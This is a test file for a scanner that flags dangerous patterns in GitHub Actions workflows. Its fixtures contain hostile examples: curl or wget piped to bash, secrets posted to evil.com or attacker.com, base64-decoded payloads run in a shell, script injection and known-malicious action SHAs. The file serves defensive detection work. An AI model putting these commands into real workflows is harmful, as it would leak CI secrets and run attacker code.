import { describe, it, expect, beforeEach, afterEach } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import * as os from "node:os";
import { scanGitHubActionsWorkflows } from "../github-actions-scanner.js";
import { getBundledFeed } from "../threat-intel.js";
import { performanceBudget } from "./performance-budget.js";

/**
 * Helper: create a temp directory with .github/workflows/ structure
 * and write workflow files into it.
 */
function createWorkflowDir(
  baseDir: string,
  workflows: Record<string, string>,
): void {
  const workflowDir = path.join(baseDir, ".github", "workflows");
  fs.mkdirSync(workflowDir, { recursive: true });

  for (const [name, content] of Object.entries(workflows)) {
    fs.writeFileSync(path.join(workflowDir, name), content);
  }
}

describe("GitHub Actions Workflow Scanner", () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join("/tmp", "scg-gha-test-"));
  });

  afterEach(() => {
    fs.rmSync(tempDir, { recursive: true, force: true });
  });

  it("should return no findings for a clean workflow", () => {
    createWorkflowDir(tempDir, {
      "ci.yml": `
name: CI
on: [push, pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - run: npm ci
      - run: npm test
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    // Only expect info/low findings for well-known actions with version tags
    const highOrAbove = findings.filter(
      (f) => f.severity === "high" || f.severity === "critical",
    );
    expect(highOrAbove).toHaveLength(0);
  });

  it("should return empty findings when no .github/workflows directory exists", () => {
    const findings = scanGitHubActionsWorkflows(tempDir);
    expect(findings).toHaveLength(0);
  });

  // -- Remote content piped to shell --

  it("should detect curl piped to bash", () => {
    createWorkflowDir(tempDir, {
      "setup.yml": `
name: Setup
on: push
jobs:
  install:
    runs-on: ubuntu-latest
    steps:
      - run: curl -fsSL https://example.com/install.sh | bash
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const finding = findings.find((f) => f.rule === "GHA_CURL_PIPE_EXEC");
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe("high");
    expect(finding?.file).toContain("setup.yml");
  });

  it("should detect wget piped to sh", () => {
    createWorkflowDir(tempDir, {
      "setup.yml": `
name: Setup
on: push
jobs:
  install:
    runs-on: ubuntu-latest
    steps:
      - run: wget -qO- https://example.com/setup.sh | sh
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const finding = findings.find((f) => f.rule === "GHA_WGET_PIPE_EXEC");
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe("high");
  });

  it("should detect curl download then execute pattern", () => {
    createWorkflowDir(tempDir, {
      "setup.yml": `
name: Setup
on: push
jobs:
  install:
    runs-on: ubuntu-latest
    steps:
      - run: curl -o setup.sh https://evil.com/payload && bash setup.sh
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const finding = findings.find((f) => f.rule === "GHA_CURL_DOWNLOAD_EXEC");
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe("high");
  });

  // -- Secrets exfiltration --

  it("should detect secrets sent via curl", () => {
    createWorkflowDir(tempDir, {
      "deploy.yml": `
name: Deploy
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: curl -H "Authorization: $\{{ secrets.API_KEY }}" https://evil.com/collect
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const finding = findings.find((f) => f.rule === "GHA_SECRET_CURL");
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe("high");
  });

  it("should detect secrets exfiltration with curl preceding secret ref", () => {
    createWorkflowDir(tempDir, {
      "deploy.yml": `
name: Deploy
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: |
          $\{{ secrets.TOKEN }} && curl https://attacker.com/steal
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const secretFindings = findings.filter(
      (f) => f.rule === "GHA_SECRET_CURL" || f.rule === "GHA_SECRET_EXFIL_MULTILINE",
    );
    expect(secretFindings.length).toBeGreaterThan(0);
  });

  // -- Unpinned action versions --

  it("should detect unpinned action using @main", () => {
    createWorkflowDir(tempDir, {
      "ci.yml": `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: some-org/some-action@main
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const finding = findings.find((f) => f.rule === "GHA_UNPINNED_ACTION");
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe("medium");
    expect(finding?.description).toContain("@main");
  });

  it("should detect unpinned action using @master", () => {
    createWorkflowDir(tempDir, {
      "ci.yml": `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: some-org/some-action@master
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const finding = findings.find((f) => f.rule === "GHA_UNPINNED_ACTION");
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe("medium");
  });

  it("should not flag actions pinned to commit SHAs as unpinned", () => {
    createWorkflowDir(tempDir, {
      "ci.yml": `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const unpinned = findings.filter((f) => f.rule === "GHA_UNPINNED_ACTION");
    expect(unpinned).toHaveLength(0);
  });

  // -- Third-party actions --

  it("should flag third-party actions from untrusted owners", () => {
    createWorkflowDir(tempDir, {
      "ci.yml": `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: unknown-owner/suspicious-action@v1
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const finding = findings.find((f) => f.rule === "GHA_THIRD_PARTY_ACTION");
    expect(finding).toBeDefined();
  });

  it("should not flag official GitHub actions as third-party", () => {
    createWorkflowDir(tempDir, {
      "ci.yml": `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
      - uses: github/codeql-action/init@v3
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const thirdParty = findings.filter(
      (f) => f.rule === "GHA_THIRD_PARTY_ACTION",
    );
    expect(thirdParty).toHaveLength(0);
  });

  // -- Base64 encoded payloads --

  it("should detect base64 encoded payloads decoded and executed", () => {
    createWorkflowDir(tempDir, {
      "ci.yml": `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Y3VybCBodHRwczovL2V2aWwuY29tL3BheWxvYWQgfCBiYXNo" | base64 -d | bash
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const b64Finding = findings.find(
      (f) => f.rule === "GHA_BASE64_PAYLOAD" || f.rule === "GHA_BASE64_EXEC",
    );
    expect(b64Finding).toBeDefined();
    expect(b64Finding?.severity).toBe("high");
  });

  it("should detect base64 --decode piped to shell", () => {
    createWorkflowDir(tempDir, {
      "ci.yml": `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: cat payload.txt | base64 --decode | node
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const finding = findings.find((f) => f.rule === "GHA_BASE64_EXEC");
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe("high");
  });

  // -- eval in run blocks --

  it("should detect eval with command substitution", () => {
    createWorkflowDir(tempDir, {
      "ci.yml": `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: eval $(curl -s https://evil.com/commands)
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const evalFinding = findings.find(
      (f) => f.rule === "GHA_EVAL_SUBSHELL",
    );
    expect(evalFinding).toBeDefined();
    expect(evalFinding?.severity).toBe("high");
  });

  // -- Multiple workflow files --

  it("should scan multiple workflow files", () => {
    createWorkflowDir(tempDir, {
      "ci.yml": `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: some-org/action@main
`,
      "deploy.yml": `
name: Deploy
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: curl https://evil.com/script | bash
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const ciFindings = findings.filter(
      (f) => f.file?.includes("ci.yml"),
    );
    const deployFindings = findings.filter(
      (f) => f.file?.includes("deploy.yml"),
    );
    expect(ciFindings.length).toBeGreaterThan(0);
    expect(deployFindings.length).toBeGreaterThan(0);
  });

  // -- .yaml extension support --

  it("should scan .yaml files in addition to .yml", () => {
    createWorkflowDir(tempDir, {
      "build.yaml": `
name: Build
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl https://example.com/install | bash
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const finding = findings.find((f) => f.rule === "GHA_CURL_PIPE_EXEC");
    expect(finding).toBeDefined();
    expect(finding?.file).toContain("build.yaml");
  });

  // -- Line number accuracy --

  it("should report correct line numbers", () => {
    createWorkflowDir(tempDir, {
      "ci.yml": `name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo hello
      - run: curl https://evil.com/payload | bash
      - run: echo done
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);
    const finding = findings.find((f) => f.rule === "GHA_CURL_PIPE_EXEC");
    expect(finding).toBeDefined();
    expect(finding?.line).toBe(8);
  });

  // -- Non-workflow files are ignored --

  it("should ignore non-YAML files in workflows directory", () => {
    createWorkflowDir(tempDir, {
      "ci.yml": `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: npm test
`,
    });

    // Add a non-YAML file
    const workflowDir = path.join(tempDir, ".github", "workflows");
    fs.writeFileSync(
      path.join(workflowDir, "README.md"),
      "# Workflows\ncurl https://evil.com | bash",
    );

    const findings = scanGitHubActionsWorkflows(tempDir);
    const curlFindings = findings.filter(
      (f) => f.rule === "GHA_CURL_PIPE_EXEC",
    );
    expect(curlFindings).toHaveLength(0);
  });

  // -- Integration: used by main scanner --

  it("should detect multiple issues in a single workflow", () => {
    createWorkflowDir(tempDir, {
      "malicious.yml": `
name: Malicious
on: push
jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
      - uses: evil-org/backdoor@main
      - run: |
          curl -fsSL https://evil.com/stage1.sh | bash
          echo "c3RlYWwgc2VjcmV0cw==" | base64 -d | sh
`,
    });

    const findings = scanGitHubActionsWorkflows(tempDir);

    // Should find unpinned action
    expect(findings.some((f) => f.rule === "GHA_UNPINNED_ACTION")).toBe(true);
    // Should find curl pipe exec
    expect(findings.some((f) => f.rule === "GHA_CURL_PIPE_EXEC")).toBe(true);
    // Should find base64 payload or exec
    expect(
      findings.some(
        (f) => f.rule === "GHA_BASE64_PAYLOAD" || f.rule === "GHA_BASE64_EXEC",
      ),
    ).toBe(true);
    // Should have third-party action finding
    expect(findings.some((f) => f.rule === "GHA_THIRD_PARTY_ACTION")).toBe(true);
  });
});

// ─── v4.9 new pattern tests ────────────────────────────────────────────────

function writeWorkflow(baseDir: string, name: string, content: string) {
  const workflowDir = path.join(baseDir, ".github", "workflows");
  fs.mkdirSync(workflowDir, { recursive: true });
  fs.writeFileSync(path.join(workflowDir, name), content);
}

describe("GHA PPE / Script Injection (v4.9)", () => {
  let tempDir: string;
  beforeEach(() => { tempDir = fs.mkdtempSync(path.join("/tmp", "scg-gha-v49-")); });
  afterEach(() => { fs.rmSync(tempDir, { recursive: true, force: true }); });

  it("should detect pull_request_target context usage (PPE)", () => {
    // Use regular strings to avoid ${{ being mis-parsed as template literal expression
    const content = [
      "on: pull_request_target",
      "jobs:",
      "  build:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - run: echo ${{ github.event.pull_request.head.sha }}",
    ].join("\n");
    writeWorkflow(tempDir, "ppe.yml", content);
    const findings = scanGitHubActionsWorkflows(tempDir);
    expect(findings.some((f) => f.rule === "GHA_PPE_PULL_TARGET")).toBe(true);
    expect(findings.find((f) => f.rule === "GHA_PPE_PULL_TARGET")?.severity).toBe("critical");
  });

  it("should detect script injection via issue body", () => {
    const content = [
      "on: issues",
      "jobs:",
      "  process:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      '      - run: echo "${{ github.event.issue.body }}"',
    ].join("\n");
    writeWorkflow(tempDir, "inject.yml", content);
    const findings = scanGitHubActionsWorkflows(tempDir);
    expect(findings.some((f) => f.rule === "GHA_SCRIPT_INJECTION")).toBe(true);
    expect(findings.find((f) => f.rule === "GHA_SCRIPT_INJECTION")?.severity).toBe("critical");
  });

  it("should detect script injection via PR title", () => {
    const content = [
      "on: pull_request",
      "jobs:",
      "  process:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      '      - run: echo "${{ github.event.pull_request.title }}"',
    ].join("\n");
    writeWorkflow(tempDir, "inject.yml", content);
    const findings = scanGitHubActionsWorkflows(tempDir);
    expect(findings.some((f) => f.rule === "GHA_SCRIPT_INJECTION")).toBe(true);
  });

  it("should detect OIDC id-token write permission", () => {
    writeWorkflow(tempDir, "oidc.yml", `
on: push
permissions:
  id-token: write
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: echo deploying
`);
    const findings = scanGitHubActionsWorkflows(tempDir);
    expect(findings.some((f) => f.rule === "GHA_OIDC_WRITE_PERM")).toBe(true);
    expect(findings.find((f) => f.rule === "GHA_OIDC_WRITE_PERM")?.severity).toBe("medium");
  });

  it("describes GHA_OIDC_WRITE_PERM as the presence check it is", () => {
    // The rule matches the permission alone. Its text must not imply that it
    // correlated the permission with third-party actions or outbound calls.
    writeWorkflow(tempDir, "oidc.yml", `
on: push
permissions:
  id-token: write
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: echo deploying
`);
    const finding = scanGitHubActionsWorkflows(tempDir).find((f) => f.rule === "GHA_OIDC_WRITE_PERM");
    expect(finding?.description).not.toMatch(/combined with|third-party|curl/i);
    expect(finding?.description).toMatch(/does not inspect/i);
  });

  it("should detect cache poisoning via github.head_ref", () => {
    writeWorkflow(tempDir, "cache.yml", `
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/cache@v3
        with:
          key: runner.os-github.head_ref-node-modules
`);
    const findings = scanGitHubActionsWorkflows(tempDir);
    expect(findings.some((f) => f.rule === "GHA_CACHE_POISONING")).toBe(true);
    expect(findings.find((f) => f.rule === "GHA_CACHE_POISONING")?.severity).toBe("high");
  });

  it("should detect self-modifying workflow", () => {
    writeWorkflow(tempDir, "worm.yml", `
on: push
jobs:
  persist:
    runs-on: ubuntu-latest
    steps:
      - run: echo "malicious" > .github/workflows/injected.yml
`);
    const findings = scanGitHubActionsWorkflows(tempDir);
    expect(findings.some((f) => f.rule === "GHA_SELF_MODIFY")).toBe(true);
    expect(findings.find((f) => f.rule === "GHA_SELF_MODIFY")?.severity).toBe("critical");
  });

  it("should detect known malicious action SHA (tj-actions compromise)", () => {
    writeWorkflow(tempDir, "ci.yml", `
on: push
jobs:
  changes:
    runs-on: ubuntu-latest
    steps:
      - uses: tj-actions/changed-files@0e58ed8671d6b60d0890c21b07f8835ace038e67
`);
    const findings = scanGitHubActionsWorkflows(tempDir);
    expect(findings.some((f) => f.rule === "GHA_KNOWN_MALICIOUS_SHA")).toBe(true);
    expect(findings.find((f) => f.rule === "GHA_KNOWN_MALICIOUS_SHA")?.severity).toBe("critical");
  });

  // Feed-driven (actions: entries). One of the 75 imposter commits the
  // trivy-action tags were repointed to in March 2026.
  it("should detect a TeamPCP trivy-action imposter commit", () => {
    writeWorkflow(tempDir, "scan.yml", `
on: push
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: aquasecurity/trivy-action@7550f14b64c1c724035a075b36e71423719a1f30 # 0.34.2
`);
    const hit = scanGitHubActionsWorkflows(tempDir).find((f) => f.rule === "GHA_KNOWN_MALICIOUS_SHA");
    expect(hit?.description).toContain("TeamPCP Trivy Actions compromise");
    expect(hit?.line).toBe(7);
  });

  // A commit SHA names one commit object; pushed from a fork it is reachable
  // under any repository of the fork network, so the match is by SHA alone.
  it("should detect a malicious SHA referenced through another repository name", () => {
    writeWorkflow(tempDir, "ci.yml", `
on: push
jobs:
  changes:
    runs-on: ubuntu-latest
    steps:
      - uses: someone-else/changed-files@0E58ED8671D6B60D0890C21B07F8835ACE038E67
`);
    expect(scanGitHubActionsWorkflows(tempDir).some((f) => f.rule === "GHA_KNOWN_MALICIOUS_SHA")).toBe(true);
  });

  // A composite action's own `uses:` steps run with the caller's secrets, and
  // the workflow walker never reads action.yml, so it is checked on its own.
  it("checks uses: in composite action metadata anywhere in the repo", async () => {
    const { scanActionMetadataReferences, isActionMetadataFile } = await import("../github-actions-scanner.js");
    const yml = [
      "name: setup",
      "runs:",
      "  using: composite",
      "  steps:",
      "    - uses: aquasecurity/trivy-action@7550f14b64c1c724035a075b36e71423719a1f30",
      "    - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683",
    ].join("\n");
    const found = scanActionMetadataReferences(yml, ".github/actions/setup/action.yml");
    expect(found.map((f) => f.rule)).toEqual(["GHA_KNOWN_MALICIOUS_SHA"]);
    expect(found[0]?.line).toBe(5);
    expect(isActionMetadataFile(".github/actions/setup/action.yml")).toBe(true);
    expect(isActionMetadataFile("action.yaml")).toBe(true);
    // Workflows are the workflow walker's; never dispatched twice.
    expect(isActionMetadataFile(".github/workflows/action.yml")).toBe(false);
    expect(isActionMetadataFile("docs/action.yml.md")).toBe(false);
  });

  // Data contract the SHA index relies on: every bundled actions: entry is a
  // lowercase owner/repo pinned to a lowercase 40-hex commit SHA.
  it("keeps every bundled actions: entry a lowercase repo@sha pin", () => {
    const entries = getBundledFeed().filter((i) => i.type === "package" && i.value.startsWith("actions:"));
    expect(entries.length).toBeGreaterThanOrEqual(117);
    for (const ioc of entries) {
      expect(ioc.value, ioc.value).toMatch(/^actions:[a-z0-9_.-]+\/[a-z0-9_.-]+@[0-9a-f]{40}$/);
      expect(ioc.campaign, `${ioc.value} must be curated`).toBeTruthy();
    }
  });

  // The control: the clean 0.35.0 release every imposter commit was parented on.
  it("should not flag the clean trivy-action release", () => {
    writeWorkflow(tempDir, "scan.yml", `
on: push
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: aquasecurity/trivy-action@57a97c7e7821a5776cebc9bb87c984fa69cba8f1 # 0.35.0
`);
    expect(scanGitHubActionsWorkflows(tempDir).filter((f) => f.rule === "GHA_KNOWN_MALICIOUS_SHA")).toEqual([]);
  });

  it("should not flag legitimate SHA-pinned action", () => {
    writeWorkflow(tempDir, "ci.yml", `
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
`);
    const findings = scanGitHubActionsWorkflows(tempDir);
    expect(findings.some((f) => f.rule === "GHA_KNOWN_MALICIOUS_SHA")).toBe(false);
  });

  it("should detect artifact download warning", () => {
    writeWorkflow(tempDir, "deploy.yml", `
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v3
        with:
          name: build-output
`);
    const findings = scanGitHubActionsWorkflows(tempDir);
    expect(findings.some((f) => f.rule === "GHA_ARTIFACT_DOWNLOAD")).toBe(true);
  });
});

describe("GHA artifact trust context (v5.23.4)", () => {
  let tempDir: string;
  beforeEach(() => { tempDir = fs.mkdtempSync(path.join("/tmp", "scg-gha-artifact-")); });
  afterEach(() => { fs.rmSync(tempDir, { recursive: true, force: true }); });

  const uploadSha = "043fb46d1a93c77aae656e7c1c64a875d1fc6a0a";
  const downloadSha = "3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c";

  it("suppresses a trusted, SHA-pinned, current-run handoff through needs", () => {
    const workflow = [
      "on:",
      "  push:",
      "    tags: ['v*']",
      "  workflow_dispatch:",
      "permissions:",
      "  contents: read",
      "  packages: write",
      "jobs:",
      "  build:",
      "    strategy:",
      "      matrix:",
      "        slug: [amd64, arm64]",
      "    steps:",
      `      - uses: actions/upload-artifact@${uploadSha}`,
      "        with:",
      "          name: digest-${{ matrix.slug }}",
      "          path: /tmp/digests/${{ matrix.slug }}",
      "  merge:",
      "    needs: build",
      "    steps:",
      `      - uses: actions/download-artifact@${downloadSha}`,
      "        with:",
      "          pattern: digest-*",
      "          merge-multiple: true",
    ].join("\n");
    writeWorkflow(tempDir, "docker.yml", workflow);

    const findings = scanGitHubActionsWorkflows(tempDir);
    expect(findings.filter((f) => f.rule === "GHA_ARTIFACT_DOWNLOAD")).toEqual([]);
  });

  it("accepts a matching producer through transitive needs", () => {
    const workflow = [
      "on: push",
      "jobs:",
      "  build:",
      "    steps:",
      `      - uses: actions/upload-artifact@${uploadSha}`,
      "        with:",
      "          name: package",
      "  verify:",
      "    needs: build",
      "    steps:",
      "      - run: echo verified",
      "  deploy:",
      "    needs: verify",
      "    steps:",
      `      - uses: actions/download-artifact@${downloadSha}`,
      "        with:",
      "          name: package",
    ].join("\n");
    writeWorkflow(tempDir, "transitive.yml", workflow);

    const findings = scanGitHubActionsWorkflows(tempDir);
    expect(findings.some((f) => f.rule === "GHA_ARTIFACT_DOWNLOAD")).toBe(false);
  });

  it("retains detection for explicit cross-run or cross-repository access", () => {
    const workflow = [
      "on: push",
      "jobs:",
      "  build:",
      "    steps:",
      `      - uses: actions/upload-artifact@${uploadSha}`,
      "        with:",
      "          name: package",
      "  consume:",
      "    needs: build",
      "    steps:",
      `      - uses: actions/download-artifact@${downloadSha}`,
      "        with:",
      "          name: package",
      "          repository: owner/other",
      "          run-id: 1234",
      "          github-token: ${{ secrets.ARTIFACT_TOKEN }}",
    ].join("\n");
    writeWorkflow(tempDir, "cross-run.yml", workflow);

    const finding = scanGitHubActionsWorkflows(tempDir).find(
      (candidate) => candidate.rule === "GHA_ARTIFACT_DOWNLOAD",
    );
    expect(finding?.description).toContain("cross-run or cross-repository");
  });

  it("retains detection for pull_request_target artifact flow", () => {
    const workflow = [
      "on: pull_request_target",
      "jobs:",
      "  build:",
      "    steps:",
      `      - uses: actions/upload-artifact@${uploadSha}`,
      "        with:",
      "          name: package",
      "  deploy:",
      "    needs: build",
      "    steps:",
      `      - uses: actions/download-artifact@${downloadSha}`,
      "        with:",
      "          name: package",
    ].join("\n");
    writeWorkflow(tempDir, "pwn-request.yml", workflow);

    const finding = scanGitHubActionsWorkflows(tempDir).find(
      (candidate) => candidate.rule === "GHA_ARTIFACT_DOWNLOAD",
    );
    expect(finding?.description).toContain("pull_request_target");
  });

  it("retains detection without a producer dependency", () => {
    const workflow = [
      "on: push",
      "jobs:",
      "  build:",
      "    steps:",
      `      - uses: actions/upload-artifact@${uploadSha}`,
      "        with:",
      "          name: package",
      "  deploy:",
      "    steps:",
      `      - uses: actions/download-artifact@${downloadSha}`,
      "        with:",
      "          name: package",
    ].join("\n");
    writeWorkflow(tempDir, "missing-needs.yml", workflow);

    const finding = scanGitHubActionsWorkflows(tempDir).find(
      (candidate) => candidate.rule === "GHA_ARTIFACT_DOWNLOAD",
    );
    expect(finding?.description).toContain("transitive needs graph");
  });

  it("does not let one safe handoff suppress an unrelated download", () => {
    const workflow = [
      "on: push",
      "jobs:",
      "  build:",
      "    steps:",
      `      - uses: actions/upload-artifact@${uploadSha}`,
      "        with:",
      "          name: reviewed",
      "  consume:",
      "    needs: build",
      "    steps:",
      `      - uses: actions/download-artifact@${downloadSha}`,
      "        with:",
      "          name: reviewed",
      `      - uses: actions/download-artifact@${downloadSha}`,
      "        with:",
      "          name: unrelated",
    ].join("\n");
    writeWorkflow(tempDir, "mixed.yml", workflow);

    const findings = scanGitHubActionsWorkflows(tempDir).filter(
      (candidate) => candidate.rule === "GHA_ARTIFACT_DOWNLOAD",
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]?.description).toContain("no matching artifact producer");
  });

  it("retains detection when the download action uses a mutable branch", () => {
    const workflow = [
      "on: push",
      "jobs:",
      "  build:",
      "    steps:",
      `      - uses: actions/upload-artifact@${uploadSha}`,
      "        with:",
      "          name: package",
      "  consume:",
      "    needs: build",
      "    steps:",
      "      - uses: actions/download-artifact@main",
      "        with:",
      "          name: package",
    ].join("\n");
    writeWorkflow(tempDir, "mutable.yml", workflow);

    const finding = scanGitHubActionsWorkflows(tempDir).find(
      (candidate) => candidate.rule === "GHA_ARTIFACT_DOWNLOAD",
    );
    expect(finding?.description).toContain("mutable or unrecognized");
  });

  it("does not trust a matching artifact uploaded by a job outside needs", () => {
    const workflow = [
      "on: push",
      "jobs:",
      "  reviewed-build:",
      "    steps:",
      `      - uses: actions/upload-artifact@${uploadSha}`,
      "        with:",
      "          name: package",
      "  unlinked-build:",
      "    steps:",
      `      - uses: actions/upload-artifact@${uploadSha}`,
      "        with:",
      "          name: package",
      "  consume:",
      "    needs: reviewed-build",
      "    steps:",
      `      - uses: actions/download-artifact@${downloadSha}`,
      "        with:",
      "          name: package",
    ].join("\n");
    writeWorkflow(tempDir, "unlinked-producer.yml", workflow);

    const finding = scanGitHubActionsWorkflows(tempDir).find(
      (candidate) => candidate.rule === "GHA_ARTIFACT_DOWNLOAD",
    );
    expect(finding?.description).toContain("no matching artifact producer");
  });
});

describe("GHA_SECRET_EXFIL_MULTILINE: every expression form of a secret reference", () => {
  let tempDir: string;
  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "scg-gha-exfil-forms-"));
  });
  afterEach(() => {
    fs.rmSync(tempDir, { recursive: true, force: true });
  });

  /** One step: `env: T: <value>`, then a curl on line 10. Returns EXFIL lines. */
  function exfilLinesFor(envValue: string): number[] {
    writeWorkflow(tempDir, "ci.yml", [
      "name: CI",
      "on: push",
      "jobs:",
      "  build:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - env:",
      `          T: ${envValue}`,
      "        run: |",
      '          curl -s -d "$T" https://x.example/collect',
    ].join("\n"));
    return scanGitHubActionsWorkflows(tempDir)
      .filter((f) => f.rule === "GHA_SECRET_EXFIL_MULTILINE")
      .map((f) => f.line ?? -1);
  }

  it.each([
    ["dot access", "${{ secrets.NPM_TOKEN }}"],
    ["bracket access, single quotes", "${{ secrets['NPM_TOKEN'] }}"],
    ["bracket access, double quotes", '${{ secrets["NPM_TOKEN"] }}'],
    ["whitespace inside the expression", "${{secrets . NPM_TOKEN}}"],
    ["a computed index", "${{ secrets[format('{0}_TOKEN', matrix.target)] }}"],
    ["the whole secrets context via toJSON", "${{ toJSON(secrets) }}"],
    ["the whole secrets context, bare", "${{ secrets }}"],
    ["a secret inside a function call", "${{ format('Bearer {0}', secrets.NPM_TOKEN) }}"],
    ["secrets.GITHUB_TOKEN", "${{ secrets.GITHUB_TOKEN }}"],
    ["bracket GITHUB_TOKEN", "${{ secrets['GITHUB_TOKEN'] }}"],
    ["github.token", "${{ github.token }}"],
    ["bracket github token", "${{ github['token'] }}"],
  ])("fires on the curl line for %s", (_label, value) => {
    expect(exfilLinesFor(value)).toEqual([10]);
  });

  it.each([
    ["a non-secret context", "${{ github.sha }}"],
    ["an env reference", "${{ env.BUILD_ID }}"],
    ["a step output named secrets", "${{ steps.secrets.outputs.value }}"],
    ["the word outside an expression", "secrets"],
  ])("does not fire for %s", (_label, value) => {
    expect(exfilLinesFor(value)).toEqual([]);
  });

  it("fires for bracket access written directly into the run body", () => {
    writeWorkflow(tempDir, "ci.yml", [
      "name: CI",
      "on: push",
      "jobs:",
      "  build:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - run: |",
      "          echo \"${{ secrets['NPM_TOKEN'] }}\" > t.txt",
      "          curl -s --data-binary @t.txt https://x.example/collect",
    ].join("\n"));
    const lines = scanGitHubActionsWorkflows(tempDir)
      .filter((f) => f.rule === "GHA_SECRET_EXFIL_MULTILINE")
      .map((f) => f.line);
    expect(lines).toEqual([9]);
  });

  it("stays linear on 5 MiB of unclosed expressions", { timeout: performanceBudget(60_000) }, () => {
    const unclosed = "${{ secrets ".repeat(Math.ceil((5 * 1024 * 1024) / 12));
    const started = performance.now();
    expect(exfilLinesFor(unclosed)).toEqual([]);
    expect(performance.now() - started).toBeLessThan(performanceBudget(15_000));
  });

  function exfilLinesForWorkflow(lines: string[]): number[] {
    writeWorkflow(tempDir, "ci.yml", lines.join("\n"));
    return scanGitHubActionsWorkflows(tempDir)
      .filter((f) => f.rule === "GHA_SECRET_EXFIL_MULTILINE")
      .map((f) => f.line ?? -1);
  }

  it("sees a secret in an inline flow-map env at step level", () => {
    expect(exfilLinesForWorkflow([
      "name: CI",
      "on: push",
      "jobs:",
      "  build:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      '      - env: { T: "${{ secrets.NPM_TOKEN }}" }',
      '        run: curl -d "$T" https://x.example',
    ])).toEqual([8]);
  });

  it("sees a secret in an inline flow-map env at job level", () => {
    expect(exfilLinesForWorkflow([
      "name: CI",
      "on: push",
      "jobs:",
      "  build:",
      "    runs-on: ubuntu-latest",
      '    env: { T: "${{ secrets.NPM_TOKEN }}" }',
      "    steps:",
      '      - run: curl -d "$T" https://x.example',
    ])).toEqual([8]);
  });

  it("sees a secret in an inline flow-map env at workflow level", () => {
    expect(exfilLinesForWorkflow([
      "name: CI",
      "on: push",
      'env: { T: "${{ secrets.NPM_TOKEN }}" }',
      "jobs:",
      "  build:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      '      - run: curl -d "$T" https://x.example',
    ])).toEqual([8]);
  });

  it("does not see an inline env of another step, another job, or a service container", () => {
    expect(exfilLinesForWorkflow([
      "name: CI",
      "on: push",
      "jobs:",
      "  a:",
      "    runs-on: ubuntu-latest",
      '    env: { T: "${{ secrets.NPM_TOKEN }}" }',
      "    steps:",
      "      - run: npm publish",
      "  b:",
      "    runs-on: ubuntu-latest",
      "    services:",
      "      db:",
      "        image: postgres:16",
